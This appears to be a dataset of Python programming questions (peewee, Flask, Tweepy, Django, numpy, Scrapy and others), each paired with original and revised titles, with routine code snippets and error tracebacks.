q: python - why is peewee including the 'id' column into the mysql select query?," I am trying to learn how to use peewee with mysql. I have an existing database on a mysql server with an existing table. The table is currently empty (I am just testing right now). I get the following error: Why is peewee adding the 'id' column into the select query? I do not have an id column in the table that already exists in the database. I simply want to work with the existing table and not depend on peewee having to create one every time I want to interact with the database. This is where I believe the error is.The result of the query should be empty since the table is empty but since I am learning I just wanted to try out the code. I appreciate your help.EDITBased on the helpful responses by Wooble and Francis I come to wonder whether it even makes sense for me to use peewee or another ORM like sqlalchemy. What are the benefits of using an ORM instead of just running direct queries in python using MySQLdb? This is what I expect to be doing:-automatically downloading data from various web servers. Most of the data is in xls or csv format. I can convert the xls into csv using the xlrd package.-parsing/processing the data in list objects before inserting/bulk-inserting into a mysql db table.-running complex queries to export data from mysql into python into appropriate data structured (lists for example) for various statistical computation that is easier to do in python instead of mysql. Anything that can be done in mysql will be done there but I may run complex regressions in python.-run various graphical packages on the data retrieved from queries. Some of this may include using the ggplot2 package (from R-project), which is an advanced graphical package. So I will involve some R/Python integration.Given the above - is it best that I spend the hours hacking away to learn ORM/Peewee/SQLAlchemy or stick to direct mysql queries using MySQLdb?  <code>  >>> db = MySQLDatabase('nhl', user='root', passwd='blahblah')>>> db.connect()>>> class schedule(Model):... date = DateField()... team = CharField()... class Meta:... database = db>>> test = schedule.select()>>> test<class '__main__.schedule'> SELECT t1.`id`, t1.`date`, t1.`team` FROM `nhl` AS t1 []>>> test.get() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1408, in get return clone.execute().next() File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1437, in execute self._qr = QueryResultWrapper(self.model_class, self._execute(), query_meta) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1232, in _execute return self.database.execute_sql(sql, params, self.require_commit) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1602, in execute_sql res = cursor.execute(sql, params or ()) File ""/usr/lib64/python2.6/site-packages/MySQLdb/cursors.py"", line 201, in execute self.errorhandler(self, exc, value) File ""/usr/lib64/python2.6/site-packages/MySQLdb/connections.py"", line 36, in defaulterrorhandler raise errorclass, errorvalue_mysql_exceptions.OperationalError: (1054, ""Unknown column 't1.id' in 'field list'"")",Why is peewee including the 'id' column into the mysql select query?
python - why is peewee including the 'id' column into the mysql select query?," I am trying to learn how to use peewee with mysql. I have an existing database on a mysql server with an existing table. The table is currently empty (I am just testing right now). I get the following error: Why is peewee adding the 'id' column into the select query? I do not have an id column in the table that already exists in the database. I simply want to work with the existing table and not depend on peewee having to create one every time I want to interact with the database. This is where I believe the error is.The result of the query should be empty since the table is empty but since I am learning I just wanted to try out the code. I appreciate your help.EDITBased on the helpful responses by Wooble and Francis I come to wonder whether it even makes sense for me to use peewee or another ORM like sqlalchemy. What are the benefits of using an ORM instead of just running direct queries in python using MySQLdb? This is what I expect to be doing:-automatically downloading data from various web servers. Most of the data is in xls or csv format. I can convert the xls into csv using the xlrd package.-parsing/processing the data in list objects before inserting/bulk-inserting into a mysql db table.-running complex queries to export data from mysql into python into appropriate data structured (lists for example) for various statistical computation that is easier to do in python instead of mysql. Anything that can be done in mysql will be done there but I may run complex regressions in python.-run various graphical packages on the data retrieved from queries. Some of this may include using the ggplot2 package (from R-project), which is an advanced graphical package. So I will involve some R/Python integration.Given the above - is it best that I spend the hours hacking away to learn ORM/Peewee/SQLAlchemy or stick to direct mysql queries using MySQLdb?  <code>  >>> db = MySQLDatabase('nhl', user='root', passwd='blahblah')>>> db.connect()>>> class schedule(Model):... date = DateField()... team = CharField()... class Meta:... database = db>>> test = schedule.select()>>> test<class '__main__.schedule'> SELECT t1.`id`, t1.`date`, t1.`team` FROM `nhl` AS t1 []>>> test.get() Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1408, in get return clone.execute().next() File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1437, in execute self._qr = QueryResultWrapper(self.model_class, self._execute(), query_meta) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1232, in _execute return self.database.execute_sql(sql, params, self.require_commit) File ""/usr/lib/python2.6/site-packages/peewee.py"", line 1602, in execute_sql res = cursor.execute(sql, params or ()) File ""/usr/lib64/python2.6/site-packages/MySQLdb/cursors.py"", line 201, in execute self.errorhandler(self, exc, value) File ""/usr/lib64/python2.6/site-packages/MySQLdb/connections.py"", line 36, in defaulterrorhandler raise errorclass, errorvalue_mysql_exceptions.OperationalError: (1054, ""Unknown column 't1.id' in 'field list'"")",Why is peewee including the 'id' column into the mysql select query?
flask : how to retrieve session data ?, I have flask+wtforms application. I can see in login() user object stored as Now I wanted to retrieve the user It fails with message like : <code>  if user: if user.verify_password(form.password.data): flash('You have been logged in') user.logins += 1 db.session.add(History(user.uid)) db.session.commit() session['user'] = user if 'user' in session: User=session.get('user') print User.nickname ###<< how to retrieve specific object member? Instance <User at 0x8e5a64c> is not bound to a Session; attribute refresh operation cannot proceed,How to retrieve session data with Flask?
flask : how to retrieve session data?, I have flask+wtforms application. I can see in login() user object stored as Now I wanted to retrieve the user It fails with message like : <code>  if user: if user.verify_password(form.password.data): flash('You have been logged in') user.logins += 1 db.session.add(History(user.uid)) db.session.commit() session['user'] = user if 'user' in session: User=session.get('user') print User.nickname ###<< how to retrieve specific object member? Instance <User at 0x8e5a64c> is not bound to a Session; attribute refresh operation cannot proceed,How to retrieve session data with Flask?
Twitter / Tweepy / Python / Get all tweets for a user and their attributes," I am attempting to retrieve data from Twitter, using Tweepy for a username typed at the command line. I'm wanting to extract quite a bit of data about the status and user,so have come up with the following:Note that I am importing all the required modules ok and have oauth + keys (just not included it here) and filename is correct, just been changed: I would like this eventually to iterate through all of a user's tweets (up to the 3200 limit). First things first though. So far though I have two problems, I get the following error message regarding retweets: Passing the username as a variable seems to be a problem also: I've isolated both these errors, i.e. they aren't working together. Forgive my ignorance, I am not too hot with Twitter APIs but am learning pretty rapidly. Tweepy documentation really does suck and I've done loads of reading round on the net, just can't seem to get this fixed. If I can get this sorted, i'll be posting up some documentation. I know how to transfer the data into an MySQL db once extracted (it will do that, rather than print to screen) and manipulate it so that I can do stuff with it, it is just getting it out that I am having the problems with. Does anyone have any ideas or is there another method I should be considering? Any help really appreciated. CheersEDIT: Following on from @Eric Olson's suggestion this morning; I did the following. 1) Created a completely brand new set of Oauth credentials to test. 2) Copied code across to a new script as follows: Oauth The first time i run the script, it works fine and updates my status and returns the API name as follows: Then from that point on I get this: The only reason I can see for it doing something like this is that it is rejecting the generated access token. I shouldn't need to renew the access token should I? <code>  # define user to get tweets for. accepts input from useruser = tweepy.api.get_user(input(""Please enter the twitter username: ""))# Display basic details for twitter user nameprint ("" "")print (""Basic information for"", user.name)print (""Screen Name:"", user.screen_name)print (""Name: "", user.name)print (""Twitter Unique ID: "", user.id)print (""Account created at: "", user.created_at)timeline = api.user_timeline(screen_name=user, include_rts=True, count=100) for tweet in timeline: print (""ID:"", tweet.id) print (""User ID:"", tweet.user.id) print (""Text:"", tweet.text) print (""Created:"", tweet.created_at) print (""Geo:"", tweet.geo) print (""Contributors:"", tweet.contributors) print (""Coordinates:"", tweet.coordinates) print (""Favorited:"", tweet.favorited) print (""In reply to screen name:"", tweet.in_reply_to_screen_name) print (""In reply to status ID:"", tweet.in_reply_to_status_id) print (""In reply to status ID str:"", tweet.in_reply_to_status_id_str) print (""In reply to user ID:"", tweet.in_reply_to_user_id) print (""In reply to user ID str:"", tweet.in_reply_to_user_id_str) print (""Place:"", tweet.place) print (""Retweeted:"", tweet.retweeted) print (""Retweet count:"", tweet.retweet_count) print (""Source:"", tweet.source) print (""Truncated:"", tweet.truncated) Please enter the twitter username: barackobamaTraceback (most recent call last): File "" usertimeline.py"", line 64, in <module> timeline = api.user_timeline(screen_name=user, count=100, page=1) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 401Traceback (most recent call last): File ""usertimeline.py"", line 42, in <module> user = tweepy.api.get_user(input(""Please enter the twitter username: "")) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 404 Traceback (most recent call last): File "" usertimleline.py"", line 64, in <module> timeline = api.user_timeline(screen_name=user, count=100, page=1) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 401 consumer_key = ""(removed)""consumer_secret = ""(removed)""access_key=""88394805-(removed)""access_secret=""(removed)""auth = tweepy.OAuthHandler(consumer_key, consumer_secret)auth.set_access_token(access_key, access_secret)api=tweepy.API(auth)# confirm account being used for OAuthprint (""API NAME IS: "", api.me().name)api.update_status(""Using Tweepy from the command line"") >>> API NAME IS: Chris Howden Traceback (most recent call last): File ""C:/Users/Chris/Dropbox/Uni_2012-3/6CC995 - Independent Studies/Scripts/get Api name and update status.py"", line 19, in <module> api.update_status(""Using Tweepy frm the command line"") File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 403",How can I retrieve all Tweets and attributes for a given user using Python?
Twitter / Tweepy / Python / Get all tweets for a user and their attributes - OAuth," I am attempting to retrieve data from Twitter, using Tweepy for a username typed at the command line. I'm wanting to extract quite a bit of data about the status and user,so have come up with the following:Note that I am importing all the required modules ok and have oauth + keys (just not included it here) and filename is correct, just been changed: I would like this eventually to iterate through all of a user's tweets (up to the 3200 limit). First things first though. So far though I have two problems, I get the following error message regarding retweets: Passing the username as a variable seems to be a problem also: I've isolated both these errors, i.e. they aren't working together. Forgive my ignorance, I am not too hot with Twitter APIs but am learning pretty rapidly. Tweepy documentation really does suck and I've done loads of reading round on the net, just can't seem to get this fixed. If I can get this sorted, i'll be posting up some documentation. I know how to transfer the data into an MySQL db once extracted (it will do that, rather than print to screen) and manipulate it so that I can do stuff with it, it is just getting it out that I am having the problems with. Does anyone have any ideas or is there another method I should be considering? Any help really appreciated. CheersEDIT: Following on from @Eric Olson's suggestion this morning; I did the following. 1) Created a completely brand new set of Oauth credentials to test. 2) Copied code across to a new script as follows: Oauth The first time i run the script, it works fine and updates my status and returns the API name as follows: Then from that point on I get this: The only reason I can see for it doing something like this is that it is rejecting the generated access token. I shouldn't need to renew the access token should I? <code>  # define user to get tweets for. accepts input from useruser = tweepy.api.get_user(input(""Please enter the twitter username: ""))# Display basic details for twitter user nameprint ("" "")print (""Basic information for"", user.name)print (""Screen Name:"", user.screen_name)print (""Name: "", user.name)print (""Twitter Unique ID: "", user.id)print (""Account created at: "", user.created_at)timeline = api.user_timeline(screen_name=user, include_rts=True, count=100) for tweet in timeline: print (""ID:"", tweet.id) print (""User ID:"", tweet.user.id) print (""Text:"", tweet.text) print (""Created:"", tweet.created_at) print (""Geo:"", tweet.geo) print (""Contributors:"", tweet.contributors) print (""Coordinates:"", tweet.coordinates) print (""Favorited:"", tweet.favorited) print (""In reply to screen name:"", tweet.in_reply_to_screen_name) print (""In reply to status ID:"", tweet.in_reply_to_status_id) print (""In reply to status ID str:"", tweet.in_reply_to_status_id_str) print (""In reply to user ID:"", tweet.in_reply_to_user_id) print (""In reply to user ID str:"", tweet.in_reply_to_user_id_str) print (""Place:"", tweet.place) print (""Retweeted:"", tweet.retweeted) print (""Retweet count:"", tweet.retweet_count) print (""Source:"", tweet.source) print (""Truncated:"", tweet.truncated) Please enter the twitter username: barackobamaTraceback (most recent call last): File "" usertimeline.py"", line 64, in <module> timeline = api.user_timeline(screen_name=user, count=100, page=1) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 401Traceback (most recent call last): File ""usertimeline.py"", line 42, in <module> user = tweepy.api.get_user(input(""Please enter the twitter username: "")) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 404 Traceback (most recent call last): File "" usertimleline.py"", line 64, in <module> timeline = api.user_timeline(screen_name=user, count=100, page=1) File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 401 consumer_key = ""(removed)""consumer_secret = ""(removed)""access_key=""88394805-(removed)""access_secret=""(removed)""auth = tweepy.OAuthHandler(consumer_key, consumer_secret)auth.set_access_token(access_key, access_secret)api=tweepy.API(auth)# confirm account being used for OAuthprint (""API NAME IS: "", api.me().name)api.update_status(""Using Tweepy from the command line"") >>> API NAME IS: Chris Howden Traceback (most recent call last): File ""C:/Users/Chris/Dropbox/Uni_2012-3/6CC995 - Independent Studies/Scripts/get Api name and update status.py"", line 19, in <module> api.update_status(""Using Tweepy frm the command line"") File ""C:\Python32\lib\site-packages\tweepy-1.4-py3.2.egg\tweepy\binder.py"", line 153, in _call raise TweepError(error_msg)tweepy.error.TweepError: Twitter error response: status code = 403",How can I retrieve all Tweets and attributes for a given user using Python?
Django forms.DateInput doess not apply the attributes given in attrs field," Placeholder, class not getting set when tried to apply through the django's attrs specifier for forms.DateInputThe form is a ModelForm.And according to the docs Takes same arguments as TextInput, with one more optional argument:Here is the code : The same is applied for a forms.TextInput and it works just fine.What am I missing here?Just anybody wants a full class code : The generated HTML for the field, my_date_field : The generated HTML for the field, field1 : <code>  widgets = { 'my_date_field': forms.DateInput(format=('%d-%m-%Y'), attrs={'class':'myDateClass', 'placeholder':'Select a date'} )} class trademark_form(ModelForm): my_date_field = DateField(input_formats=['%d-%m-%Y']) class Meta: model = myModel widgets = { 'my_date_field': forms.DateInput(format=('%d-%m-%Y'), attrs={'class':'myDateClass', 'placeholder':'Select a date'}), 'field1': forms.TextInput(attrs={'class':'textInputClass', 'placeholder':'Enter a Value..'}), 'field2': forms.TextInput(attrs={'class':'textInputClass', 'placeholder':'Enter a Value..', 'readonly':'readonly', 'value':10}), 'desc': forms.Textarea(attrs={'class':'textAreaInputClass', 'placeholder':'Enter desc', 'rows':5}), } exclude = ('my_valid_field') <input type=""text"" id=""id_my_date_field"" name=""my_date_field""> <input type=""text"" name=""field1"" class=""textInputClass"" placeholder=""Enter a Value.."" id=""id_field1"">",Django forms.DateInput does not apply the attributes given in attrs field
Does a Python strip on a split string do anything?," Based on some experiments, it appears to me that the following Python v2.7 code: Could be simplified as follows to drop the map of strip(): I believe this is true because the split() should remove all white space and thus the strip() would be a no-op.Are there any cases where in the above two are not identical in effect, if so, what are they? <code>  def lookup_pattern(pattern, file_containing_patterns): for line in file_containing_patterns: splits = line.split() if splits: if (pattern == splits[0]): return map(lambda x: x.strip(), splits[1:]) return None def lookup_pattern(pattern, file_containing_patterns): for line in file_containing_patterns: splits = line.split() if splits: if (pattern == splits[0]): return splits[1:] return None",Does a Python strip() on a split() string do anything?
Is it possible to assert that a method calls sys.exit(), I have a Python 2.7 method that sometimes calls Is it possible to make a unit test that verifies this line of code is called when the right conditions are met? <code>  sys.exit(1),Is it possible for a unit test to assert that a method calls sys.exit()?
Is it possible to unit test that a method calls sys.exit(), I have a Python 2.7 method that sometimes calls Is it possible to make a unit test that verifies this line of code is called when the right conditions are met? <code>  sys.exit(1),Is it possible for a unit test to assert that a method calls sys.exit()?
Is it possible in a unit test to assert that a method calls sys.exit(), I have a Python 2.7 method that sometimes calls Is it possible to make a unit test that verifies this line of code is called when the right conditions are met? <code>  sys.exit(1),Is it possible for a unit test to assert that a method calls sys.exit()?
Is it possible for a unit test to assert that a method calls sys.exit(), I have a Python 2.7 method that sometimes calls Is it possible to make a unit test that verifies this line of code is called when the right conditions are met? <code>  sys.exit(1),Is it possible for a unit test to assert that a method calls sys.exit()?
Having trouble with Python OrderedDict()!," I am having some trouble using the collections.OrderedDict class. I am using Python 2.7 on Raspbian, the Debian distro for Raspberry Pi. I am trying to print two dictionaries in order for comparison (side-by-side) for a text-adventure. The order is essential to compare accurately.No matter what I try the dictionaries print in their usual unordered way.Here's what I get when I do it on my RPi: Obviously there is something not right because it is printing the function call and putting the keys and value groups into a nested list...This is what I got by running something similar on my PC: This time, it is in order, but it shouldn't be printing the other things though right? (The putting it into list and showing function call.)Where am I making my error? It shouldn't be anything to do with the pi version of Python because it is just the Linux version. <code>  import collectionsship = {""NAME"": ""Albatross"", ""HP"":50, ""BLASTERS"":13, ""THRUSTERS"":18, ""PRICE"":250}ship = collections.OrderedDict(ship)print ship# OrderedDict([('PRICE', 250), ('HP', 50), ('NAME', 'Albatross'), ('BLASTERS', 13), ('THRUSTERS', 18)]) import collectionsJoe = {""Age"": 28, ""Race"": ""Latino"", ""Job"": ""Nurse""}Bob = {""Age"": 25, ""Race"": ""White"", ""Job"": ""Mechanic"", ""Random"": ""stuff""}#Just for clarity:Joe = collections.OrderedDict(Joe)Bob = collections.OrderedDict(Bob)print Joe# OrderedDict([('Age', 28), ('Race', 'Latino'), ('Job', 'Nurse')])print Bob# OrderedDict([('Age', 25), ('Race', 'White'), ('Job', 'Mechanic'), ('Random', 'stuff')])",Converting dict to OrderedDict
Converting dict() to OrderedDict()!," I am having some trouble using the collections.OrderedDict class. I am using Python 2.7 on Raspbian, the Debian distro for Raspberry Pi. I am trying to print two dictionaries in order for comparison (side-by-side) for a text-adventure. The order is essential to compare accurately.No matter what I try the dictionaries print in their usual unordered way.Here's what I get when I do it on my RPi: Obviously there is something not right because it is printing the function call and putting the keys and value groups into a nested list...This is what I got by running something similar on my PC: This time, it is in order, but it shouldn't be printing the other things though right? (The putting it into list and showing function call.)Where am I making my error? It shouldn't be anything to do with the pi version of Python because it is just the Linux version. <code>  import collectionsship = {""NAME"": ""Albatross"", ""HP"":50, ""BLASTERS"":13, ""THRUSTERS"":18, ""PRICE"":250}ship = collections.OrderedDict(ship)print ship# OrderedDict([('PRICE', 250), ('HP', 50), ('NAME', 'Albatross'), ('BLASTERS', 13), ('THRUSTERS', 18)]) import collectionsJoe = {""Age"": 28, ""Race"": ""Latino"", ""Job"": ""Nurse""}Bob = {""Age"": 25, ""Race"": ""White"", ""Job"": ""Mechanic"", ""Random"": ""stuff""}#Just for clarity:Joe = collections.OrderedDict(Joe)Bob = collections.OrderedDict(Bob)print Joe# OrderedDict([('Age', 28), ('Race', 'Latino'), ('Job', 'Nurse')])print Bob# OrderedDict([('Age', 25), ('Race', 'White'), ('Job', 'Mechanic'), ('Random', 'stuff')])",Converting dict to OrderedDict
"How can I quickly achieve a estimate of the distance between two (latitude, longitude) points?"," I want to be able to get a estimate of the distance between two (latitude, longitude) points. I want to undershoot, as this will be for A* graph search and I want it to be fast. The points will be at most 800 km apart. <code> ","How can I quickly estimate the distance between two (latitude, longitude) points?"
"How can I quickly estimate the distance between two (latitude, longitude) points?"," I want to be able to get a estimate of the distance between two (latitude, longitude) points. I want to undershoot, as this will be for A* graph search and I want it to be fast. The points will be at most 800 km apart. <code> ","How can I quickly estimate the distance between two (latitude, longitude) points?"
Python: how can I count occurrences on an array bigger than a given number?," Let's say I have this list: I want to know how many elements are there bigger than 7. The result should be 3. Is there an elegant way to do this in Python? I tried with count but it won't work. <code>  a = [1.1, 2, 3.1, 4, 5, 6, 7.2, 8.5, 9.1]",How can I count occurrences of elements that are bigger than a given number in an list?
numpy: how to integrate arrays of indexes?," I use Python with numpy.I have a numpy array of indexes a: I have a numpy array of indexes b: I need to join an array a with an array b:a + b => [2, 4] [5, 7] [8, 11] [12, 18] [20, 29] [33, 35]=> a and b there are arrays of indexes => [2, 18] [20, 29] [33, 35]( indexes ([2, 4][5, 7][8, 11][12, 18]) go sequentially => 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 => [2, 18] ) For this example: Can someone please suggest, how do I get out_c?Update: @Geoff suggested solution python union of multiple ranges. Whether this solution the fastest and best in large data arrays? <code>  >>> aarray([[5, 7], [12, 18], [20, 29]])>>> type(a)<type 'numpy.ndarray'> >>> barray([[2, 4], [8, 11], [33, 35]])>>> type(b)<type 'numpy.ndarray'> >>> out_carray([[2, 18], [20, 29], [33, 35]])",numpy: How to join arrays? ( to get the union of several ranges)
numpy: how to join arrays?," I use Python with numpy.I have a numpy array of indexes a: I have a numpy array of indexes b: I need to join an array a with an array b:a + b => [2, 4] [5, 7] [8, 11] [12, 18] [20, 29] [33, 35]=> a and b there are arrays of indexes => [2, 18] [20, 29] [33, 35]( indexes ([2, 4][5, 7][8, 11][12, 18]) go sequentially => 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 => [2, 18] ) For this example: Can someone please suggest, how do I get out_c?Update: @Geoff suggested solution python union of multiple ranges. Whether this solution the fastest and best in large data arrays? <code>  >>> aarray([[5, 7], [12, 18], [20, 29]])>>> type(a)<type 'numpy.ndarray'> >>> barray([[2, 4], [8, 11], [33, 35]])>>> type(b)<type 'numpy.ndarray'> >>> out_carray([[2, 18], [20, 29], [33, 35]])",numpy: How to join arrays? ( to get the union of several ranges)
Python: how to join arrays? ( to get the union of several ranges)," I use Python with numpy.I have a numpy array of indexes a: I have a numpy array of indexes b: I need to join an array a with an array b:a + b => [2, 4] [5, 7] [8, 11] [12, 18] [20, 29] [33, 35]=> a and b there are arrays of indexes => [2, 18] [20, 29] [33, 35]( indexes ([2, 4][5, 7][8, 11][12, 18]) go sequentially => 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 => [2, 18] ) For this example: Can someone please suggest, how do I get out_c?Update: @Geoff suggested solution python union of multiple ranges. Whether this solution the fastest and best in large data arrays? <code>  >>> aarray([[5, 7], [12, 18], [20, 29]])>>> type(a)<type 'numpy.ndarray'> >>> barray([[2, 4], [8, 11], [33, 35]])>>> type(b)<type 'numpy.ndarray'> >>> out_carray([[2, 18], [20, 29], [33, 35]])",numpy: How to join arrays? ( to get the union of several ranges)
How to join arrays? ( to get the union of several ranges)," I use Python with numpy.I have a numpy array of indexes a: I have a numpy array of indexes b: I need to join an array a with an array b:a + b => [2, 4] [5, 7] [8, 11] [12, 18] [20, 29] [33, 35]=> a and b there are arrays of indexes => [2, 18] [20, 29] [33, 35]( indexes ([2, 4][5, 7][8, 11][12, 18]) go sequentially => 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 => [2, 18] ) For this example: Can someone please suggest, how do I get out_c?Update: @Geoff suggested solution python union of multiple ranges. Whether this solution the fastest and best in large data arrays? <code>  >>> aarray([[5, 7], [12, 18], [20, 29]])>>> type(a)<type 'numpy.ndarray'> >>> barray([[2, 4], [8, 11], [33, 35]])>>> type(b)<type 'numpy.ndarray'> >>> out_carray([[2, 18], [20, 29], [33, 35]])",numpy: How to join arrays? ( to get the union of several ranges)
Numpy: How to join arrays? ( to get the union of several ranges)," I use Python with numpy.I have a numpy array of indexes a: I have a numpy array of indexes b: I need to join an array a with an array b:a + b => [2, 4] [5, 7] [8, 11] [12, 18] [20, 29] [33, 35]=> a and b there are arrays of indexes => [2, 18] [20, 29] [33, 35]( indexes ([2, 4][5, 7][8, 11][12, 18]) go sequentially => 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 => [2, 18] ) For this example: Can someone please suggest, how do I get out_c?Update: @Geoff suggested solution python union of multiple ranges. Whether this solution the fastest and best in large data arrays? <code>  >>> aarray([[5, 7], [12, 18], [20, 29]])>>> type(a)<type 'numpy.ndarray'> >>> barray([[2, 4], [8, 11], [33, 35]])>>> type(b)<type 'numpy.ndarray'> >>> out_carray([[2, 18], [20, 29], [33, 35]])",numpy: How to join arrays? ( to get the union of several ranges)
Tkinter Shapes: Clearing screen," When I draw a shape using: Does Tkinter keep track of the fact that it was created? In a simple game I'm making, my code has one Frame create a bunch of rectangles, and then draw a big black rectangle to clear the screen, and then draw another set of updated rectangles, and so on. Am I creating thousands of rectangle objects in memory? I know you can assign the code above to a variable, but if I don't do that and just draw directly to the canvas, does it stay in memory, or does it just draw the pixels, like in the HTML5 canvas? <code>  canvas.create_rectangle(10, 10, 50, 50, color=""green"")",How to clear Tkinter Canvas?
"Django, I can't assign 192.168.1.xxx ip to my app"," Whenever I'm trying to launch a Django server app with a LAN ip I receive the error: In localhost it works perfectly. I also was checking the network configuration and I think all is correct so I dont see where is the problem.Thanks in advance. <code>  Django version 1.4.1, using settings 'servidorMain.settings'Development server is running at http://192.168.1.XX:8080/Quit the server with CONTROL-C.Error: That IP address can't be assigned-to.","""Error: That IP address can't be assigned-to"" when running app"
Python: put current class as return type annotation," In python 3 I can make arguments and return type annotations. Example: The problem is I can't make an annotation with return type of the current class (Graph), which is not defined yet.Example: This code goes with error These annotations are really useful both for documenting and allowing IDE to recognize argument and return types => enable autocompleteUPD:So what I came up is this is either impossible or requires some hacks I don't like, so I decided to use just def reverse (self) -> 'Graph': which is understandable for documentation although breaks the rule. The downside is that it doesn't work for IDE autocomplete. <code>  class Graph: def __init__(self, V: int, E: int, edges: list): pass @classmethod def fromfile(cls, readobj: type(sys.stdin)): pass def V(self) -> int: pass def E(self) -> int: pass class Graph: def reverse(self) -> Graph: pass def reverse(self) -> Graph:NameError: name 'Graph' is not defined",putting current class as return type annotation
Cannot do repo init - i receive python errors," I have Arch LinuxPython 3.3.0I've downloaded the latest repo, and if i try to do the repo init from the Google example, i get this error: The reason for which i am forced to do a new repo init is that i must do a commit from an already initialized repo, but i've changed the git user from everywhere, and i still get this: <code>  [username@otp-username-l2 teste]$ repo init -u https://android.googlesource.com/platform/manifest Traceback (most recent call last): File ""/home/username/bin/repo"", line 738, in <module>main(sys.argv[1:])File ""/home/username/bin/repo"", line 705, in main_Init(args) File ""/home/username/bin/repo"", line 234, in _Init_CheckGitVersion() File ""/home/username/bin/repo"", line 274, in _CheckGitVersionif not ver_str.startswith('git version '):TypeError: startswith first arg must be bytes or a tuple of bytes, not str Writing objects: 100% (12/12), 966 bytes, done.Total 12 (delta 11), reused 0 (delta 0)o ssh://new.username@128.224.0.74:29418/stelvio/mm![remote rejected] branchname -> refs/for/main_dev (you are not committer oldusername@email.com) error: failed to push some refs to 'ssh://new.username@128.224.0.74:29418/project/one'","TypeError when trying to ""repo init"" on Python 3.3"
[python]dump json into yaml," I got a .json file (named it meta.json) like this: I would like to convert it to a .yaml file (named it meta.yaml) like : What I have done was : But sadly, what I got is following: Why? <code>  { ""main"": { ""title"": """", ""description"": """" }} title: """"description: """" import simplejson as jsonimport pyyamlf = open('meta.json', 'r')jsonData = json.load(f)f.close()ff = open('meta.yaml', 'w+')yamlData = {'title':'', 'description':''}yamlData['title'] = jsonData['main']['title']yamlData['description'] = jsonData['main']['description']yaml.dump(yamlData, ff)# So you can see that what I need is the value of meta.json {description: ""\u4ECA\u65E5\u306F\u96E8\u304C\u964D\u3063\u3066"", title: ""\u4ECA\u65E5\\u306F\u96E8\u304C\u964D\u3063""}",dump json into yaml
"Python, ""filtered"" line editing"," I need a function that reads input into a buffer as raw_input() would, but instead of echoing input and blocking until returning a full line, it should supress echo and invoke a callback every time the buffer changes.I say ""buffer changes"" instead of ""character is read"" because, as raw_input(), I'd like it to be aware of special keys. Backspace should work, for example.If I wanted to, for example, use the callback to simulate uppercased echo of input, the code would look like this: How can I achieve this?NOTE:I've been trying to use readline and curses to meet my ends, but both Python bindings are incomplete. curses cannot be made to start without clearing the whole screen, and readline offers a single hook before any input begins. <code>  def callback(text): print '\r' + text.upper()read_input(callback)","Python, ""filtered"" line editing, read stdin by char with no echo"
Python: How to hash a string into 8 digits?, Is there anyway that I can hash a random string into a 8 digit number without implementing any algorithms myself? <code> ,How to hash a string into 8 digits?
Python: Best way to check if list is empty without not?," How can I find out if a list is empty without using the not command?Here is what I tried: I am very much a beginner so excuse me if I do dumb mistakes. <code>  if list3[0] == []: print(""No matches found"") else: print(list3)",Check if list is empty without using the `not` command
best way to check if list is empty without not," How can I find out if a list is empty without using the not command?Here is what I tried: I am very much a beginner so excuse me if I do dumb mistakes. <code>  if list3[0] == []: print(""No matches found"") else: print(list3)",Check if list is empty without using the `not` command
Scrapy: CrawlSpider Rules process_links vs process_request," This is less of a ""how do I use these?"" and more of ""when/why would I use these?"" type question.EDIT: This question is a near duplicate of this question, which suggests the use a Download Middleware to filter such requests. Updated my question below to reflect that.In the Scrapy CrawlSpider documentation, rules accept two callables, process_links and process_request (documentation quoted below for easier reference). By default Scrapy is filtering duplicated URLs, but I'm looking to do additional filtering of requests because I get duplicates of pages that have multiple distinct URLs linking to them. Things like, However, these URLs will have a similar element in the query string - shown above it is the id.I'm thinking it would make sense to use the process_links callable of my spider to filter out duplicate requests. Questions:Is there some reason why process_request would be better suite to this task?If not, can you provide an example of when process_request would be more applicable?Is a download middleware more appropriate than either process_links or process_request? If so, can you provide an example of when process_links or process_request would be a better solution?Documentation quote: process_links is a callable, or a string (in which case a method from the spider object with that name will be used) which will be called for each list of links extracted from each response using the specified link_extractor. This is mainly used for filtering purposes. process_request is a callable, or a string (in which case a method from the spider object with that name will be used) which will be called with every request extracted by this rule, and must return a request or None (to filter out the request). <code>  URL1 = ""http://example.com/somePage.php?id=XYZ&otherParam=fluffyKittens""URL2 = ""http://example.com/somePage.php?id=XYZ&otherParam=scruffyPuppies""",Scrapy: CrawlSpider Rules process_links vs process_request vs download middleware
